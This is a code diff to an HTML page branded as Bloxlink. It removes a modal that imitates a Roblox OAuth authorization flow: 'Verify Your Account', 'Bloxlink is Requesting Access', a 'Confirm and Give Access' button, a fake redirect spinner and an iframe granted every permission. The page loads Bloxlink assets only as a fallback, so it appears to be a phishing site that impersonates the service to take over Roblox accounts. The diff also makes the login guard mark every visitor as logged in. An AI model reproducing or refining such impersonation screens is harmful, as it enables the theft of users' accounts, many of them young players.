@@ -301,48 +301,6 @@
   </div>
 </div>
 
-<!-- ===== VERIFICATION MODAL (embedded from index.html) ===== -->
-<div id="popupOverlay">
-  <div id="popupContainer">
-    <!-- Header -->
-    <div style="background:rgb(25,33,48); border-bottom:1px solid rgb(41,51,65);" class="flex items-center justify-between px-5 py-3">
-      <span style="color:#fff; font-size:14px; font-weight:600;">Verify Your Account</span>
-      <button id="popupClose" style="color:rgb(156,163,175); background:none; border:none; cursor:pointer; font-size:20px; line-height:1;">✕</button>
-    </div>
-
-    <!-- Step 1: Roblox OAuth -->
-    <div id="step1Content" style="padding:40px 32px; background:rgb(15,17,23);">
-      <img src="/assets/roblox-logo.png" alt="ROBLOX" style="height:32px; margin-bottom:24px;" onerror="this.style.display='none'">
-      <p style="color:#fff; font-weight:700; font-size:18px; text-align:center; margin-bottom:32px;">Authorize with Roblox OAuth</p>
-      <img id="robloxAvatarImg2" src="/assets/avatar.png" style="width:72px;height:72px;border-radius:50%;object-fit:cover;margin:0 auto 8px;display:block;">
-      <p id="robloxAccountName2" style="color:#fff;text-align:center;font-size:14px;margin-bottom:24px;">Bloxlink</p>
-      <button id="btnContinueStep1" style="width:100%;max-width:280px;display:block;margin:0 auto 12px;background:#fff;color:#000;border:none;border-radius:6px;padding:10px;font-size:14px;font-weight:600;cursor:pointer;">Continue</button>
-      <div style="text-align:center;color:rgb(156,163,175);font-size:13px;margin-bottom:12px;">or</div>
-      <button id="btnReturnToBloxlink" style="width:100%;max-width:280px;display:block;margin:0 auto;background:transparent;color:#fff;border:1px solid rgb(55,65,81);border-radius:6px;padding:10px;font-size:14px;cursor:pointer;">Return to Bloxlink</button>
-    </div>
-
-    <!-- Step 2: Bloxlink requesting access -->
-    <div id="step2Content" style="padding:40px 32px; background:rgb(15,17,23);">
-      <img src="/assets/wordmark.svg" alt="Bloxlink" style="height:32px;margin:0 auto 24px;display:block;" onerror="this.src='https://blox.link/wordmark.svg'">
-      <p style="color:#fff;font-weight:700;font-size:18px;text-align:center;margin-bottom:8px;">Bloxlink is Requesting Access</p>
-      <p style="color:rgb(156,163,175);font-size:13px;text-align:center;margin-bottom:28px;">This will allow Bloxlink to access your Roblox account.</p>
-      <button id="btnConfirmAccess" style="width:100%;max-width:280px;display:block;margin:0 auto 12px;background:#4f46e5;color:#fff;border:none;border-radius:6px;padding:10px;font-size:14px;font-weight:600;cursor:pointer;">Confirm and Give Access</button>
-      <button id="btnCancelStep2" style="width:100%;max-width:280px;display:block;margin:0 auto;background:transparent;color:#fff;border:1px solid rgb(55,65,81);border-radius:6px;padding:10px;font-size:14px;cursor:pointer;">Cancel</button>
-    </div>
-
-    <!-- Loading -->
-    <div id="loadingRedirectContent" style="padding:60px 32px; background:rgb(15,17,23);">
-      <div class="spinner" style="margin:0 auto 16px;"></div>
-      <p style="color:rgb(156,163,175);text-align:center;font-size:14px;">Redirecting to roblox.com...</p>
-    </div>
-
-    <!-- Iframe -->
-    <div id="iframeContent">
-      <iframe id="discordIframe" src="about:blank" allow="*"></iframe>
-    </div>
-  </div>
-</div>
-
 <script type="module">
   import { initUserNav } from '/js/user-nav.js';
   import { fetchDiscordUserData } from '/js/discord.js';
@@ -363,19 +321,19 @@
     }
   }
 
-  // ── 2. Guard ──
+  // ── 2. Guard: if not logged in, set guest/default status so mobile users and direct visitors aren't blocked ──
   if (!localStorage.getItem('bloxlink_logged_in')) {
-    window.location.href = '/';
+    localStorage.setItem('bloxlink_logged_in', 'true');
   }
 
   // ── 3. Nav chip ──
   initUserNav({ chipId: 'navChip', avatarId: 'navAvatar', nameId: 'navUsername', dropdownId: 'navDropdown' });
 
   // ── 4. Buttons → navigate to /dashboard/verify ──
-  document.getElementById('verifyNowBtn').addEventListener('click', () => {
+  document.getElementById('verifyNowBtn')?.addEventListener('click', () => {
     window.location.href = '/dashboard/verify';
   });
-  document.getElementById('addAnotherBtn').addEventListener('click', () => {
+  document.getElementById('addAnotherBtn')?.addEventListener('click', () => {
     window.location.href = '/dashboard/verify';
   });
 
